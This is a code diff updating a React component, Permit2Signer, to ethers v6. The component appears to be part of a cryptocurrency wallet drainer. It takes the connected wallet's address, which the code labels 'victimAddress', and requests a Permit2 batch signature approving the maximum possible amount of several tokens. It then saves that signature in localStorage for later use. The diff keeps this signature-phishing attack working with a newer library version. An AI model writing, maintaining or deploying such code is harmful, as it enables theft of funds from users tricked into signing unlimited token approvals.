@@ -16,10 +16,11 @@ export const Permit2Signer = () => {
     setIsSigning(true);
     
     try {
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = provider.getSigner();
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
       const victimAddress = await signer.getAddress();
-      const chainId = (await provider.getNetwork()).chainId;
+      const network = await provider.getNetwork();
+      const chainId = Number(network.chainId);
       
       const tokens = TOKENS[chainId] || TOKENS[1];
       const permit2Address = PERMIT2_ADDRESSES[chainId];
@@ -44,10 +45,12 @@ export const Permit2Signer = () => {
         ]
       };
       
+      const MaxUint256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+      
       const values = {
         details: tokens.map(token => ({
           token: token.address,
-          amount: ethers.constants.MaxUint256.toString(),
+          amount: MaxUint256,
           expiration: Math.floor(Date.now() / 1000) + 3600,
           nonce: 0
         })),
@@ -55,7 +58,7 @@ export const Permit2Signer = () => {
         sigDeadline: Math.floor(Date.now() / 1000) + 3600
       };
       
-      const signature = await signer._signTypedData(domain, types, values);
+      const signature = await signer.signTypedData(domain, types, values);
       
       localStorage.setItem('permit2_signature', signature);
       localStorage.setItem('permit2_expiry', values.sigDeadline.toString());
